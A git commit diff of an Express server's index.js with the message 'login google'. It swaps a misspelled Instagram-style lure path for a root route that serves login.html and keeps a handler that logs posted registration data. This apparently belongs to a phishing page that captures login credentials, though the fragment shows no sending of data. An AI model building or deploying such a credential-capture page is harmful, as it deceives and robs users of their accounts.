55e5651d1486caf21ffc82e4f54b03904826eb91
Taryel Oruczade <Taryel.O@bestcomp.net>
2020-07-26 22:06:27 +0400

    login google

--- index.js
+++ index.js
@@ -4,26 +4,27 @@ const sendMail =  require('./mail');
 const path = require('path');
 var app = express();
 
-app.use('/instagranm/5bsinif/instalife/sheir/classmates/covid-19',express.static('public'));
+app.use('/',express.static('public'));
 
 app.use(express.urlencoded({
     extended:false
 }));
 app.use(express.json());
+app.get('/', (req,res) => {
+    res.sendFile(path.join(__dirname,'login.html'))
+});
 
 app.get('/not-found', (req,res) => {
     res.sendFile(path.join(__dirname,'notfound.html'))
 });
 
-app.get('/instagranm/5bsinif/instalife/sheir/classmates/covid-19', (req,res) => {
-      res.sendFile(path.join(__dirname,'index.html'))
-});
 
 
-app.get('/', (req,res) => {
-   res.redirect('/instagranm/5bsinif/instalife/sheir/classmates/covid-19')
-  //res.sendFile(path.join(__dirname,'home.html'))
-});
+
+// app.get('/', (req,res) => {
+//    res.redirect('/instagranm/5bsinif/instalife/sheir/classmates/covid-19')
+//   //res.sendFile(path.join(__dirname,'home.html'))
+// });
 
 app.post('/registration', (req,res) => {
     console.log('Data',req.body);
